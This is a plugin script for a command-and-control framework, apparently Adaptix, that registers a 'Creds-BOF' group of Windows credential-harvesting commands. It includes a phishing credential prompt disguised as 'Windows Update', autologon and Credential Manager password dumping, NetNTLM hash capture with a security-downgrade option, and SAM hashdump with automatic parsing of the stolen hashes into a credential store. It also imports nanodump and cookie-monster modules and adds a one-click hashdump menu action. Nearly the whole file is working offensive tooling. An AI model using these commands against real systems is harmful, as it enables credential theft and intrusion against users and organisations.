var metadata = {
    name: "Creds-BOF",
    description: "BOF tools that can be used to harvest passwords"
};

ax.script_import(ax.script_dir() + "nanodump/nanodump.axs")
ax.script_import(ax.script_dir() + "cookie-monster/cookie-monster.axs")

/// COMMANDS

var cmd_askcreds = ax.create_command("askcreds", "Prompt for credentials", "askcreds -p \"Windows Update\"");
cmd_askcreds.addArgFlagString("-p", "prompt",    "", "Restore Network Connection");
cmd_askcreds.addArgFlagString("-n", "note",      "", "Please verify your Windows user credentials to proceed");
cmd_askcreds.addArgFlagInt(   "-t", "wait_time", "", 30);
cmd_askcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let prompt    = parsed_json["prompt"];
    let note      = parsed_json["note"];
    let wait_time = parsed_json["wait_time"];

    let bof_params = ax.bof_pack("wstr,wstr,int", [prompt, note, wait_time]);
    let bof_path = ax.script_dir() + "_bin/askcreds." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF implementation: askcreds");
});



var cmd_autologon = ax.create_command("autologon", "Checks the registry for autologon information", "autologon");
cmd_autologon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/autologon." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: autologon");
});



var cmd_credman = ax.create_command("credman", "Checks the current user's Windows Credential Manager for saved web passwords", "credman");
cmd_credman.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/credman." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: credman");
});



var cmd_get_ntlm = ax.create_command("get-netntlm", "Retrieve NetNTLM hash for the current user", "get-netntlm --no-ess");
cmd_get_ntlm.addArgBool( "--no-ess", "The option can be utilized and if you would like the attempt to disable session security in NetNTLMv1");
cmd_get_ntlm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let no_ess = 0;
    if(parsed_json["--no-ess"]) { no_ess = 1; }

    let bof_params = ax.bof_pack("int", [no_ess]);
    let bof_path = ax.script_dir() + "_bin/get-netntlm." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF implementation: Internal Monologue");
});



var cmd_hashdump = ax.create_command("hashdump", "Dump SAM hashes", "hashdump");
cmd_hashdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task)
    {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        let regex = /^([a-zA-Z0-9_\-]+):\d+:([a-fA-F0-9]{32})$/gm;
        while ((match = regex.exec(task.text)) !== null) {
            ax.credentials_add(match[1], match[2], "", "ntlm", "", "SAM", `${computer} (${address})`);
        }

        return task;
    }
    let bof_path = ax.script_dir() + "_bin/hashdump." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: hashdump", hook);
});

var group_test = ax.create_commands_group("Creds-BOF", [
    cmd_askcreds, cmd_autologon, cmd_credman, cmd_get_ntlm, cmd_hashdump, cmd_cookie_monster,
    cmd_nanodump, cmd_nanodump_ppl_dump, cmd_nanodump_ppl_medic, cmd_nanodump_ssp
]);
ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);



/// MENU

let hashdump_access_action = menu.create_action("SAM hashdump", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "hashdump")) });
menu.add_session_access(hashdump_access_action, ["beacon", "gopher"], ["windows"]);